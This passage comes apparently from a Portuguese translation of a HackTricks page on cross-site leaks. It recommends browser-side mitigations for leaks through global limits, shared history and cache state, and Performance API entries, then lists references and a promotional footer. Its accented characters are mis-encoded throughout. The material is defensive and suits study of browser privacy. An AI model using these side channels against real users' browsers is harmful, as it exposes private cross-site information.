* **Limites Globais**. Corrigir t√©cnicas de vazamento que abusam de limites globais √© relativamente complexo porque eles dependem de restri√ß√µes f√≠sicas. A recomenda√ß√£o geral √©, portanto, **restringir os limites globais em uma pequena base por site**. Se o limite global for 1, como para a API de Pagamento, o invasor pode tentar silenciosamente ativar a interface de pagamento da web a qualquer momento, o que s√≥ ter√° sucesso se a interface n√£o estiver sendo usada simultaneamente por outra guia. Recomendamos acessar a API de Pagamento apenas quando um evento confi√°vel for usado. Dessa forma, o limite global √© definido como zero, a menos que o usu√°rio forne√ßa consentimento, como um clique do mouse esquerdo em uma janela de di√°logo, que define o limite global como um.
* **Estado Global**. **As propriedades do estado global do navegador n√£o devem ser acess√≠veis**. Por exemplo, o Firefox √© o √∫nico navegador que atualiza o hist√≥rico do estado global quando ocorre um redirecionamento, o que resulta na leitura de history.length. Os navegadores devem criar uma nova propriedade de hist√≥rico quando ocorrer um redirecionamento, em vez de armazen√°-la globalmente. Outros exemplos s√£o recursos compartilhados, como caches. Vazamentos de cache abusam do cache compartilhado usado para todos os sites abertos em um navegador. Para mitigar completamente as t√©cnicas de vazamento de cache, o cache HTTP deve ser particionado com base em cada site, como implementado pelo Safari, Google Chrome e Firefox. Observe que, no Safari, os iframes n√£o s√£o afetados pela parti√ß√£o de cache.
* **API de Desempenho**. Provamos que a API de Desempenho √© uma excelente t√©cnica de vazamento. Em muitos XS-Leaks, pudemos detectar a diferen√ßa se a resposta de uma solicita√ß√£o de origem cruzada possui ou n√£o uma entrada de desempenho. Como unifica√ß√£o, recomendamos garantir que todas as solicita√ß√µes criem essa entrada e que apenas o subconjunto correto de informa√ß√µes de tempo seja registrado para solicita√ß√µes de origem cruzada.
## Refer√™ncias

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** com facilidade, utilizando as ferramentas comunit√°rias mais avan√ßadas do mundo.\
Acesse hoje mesmo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
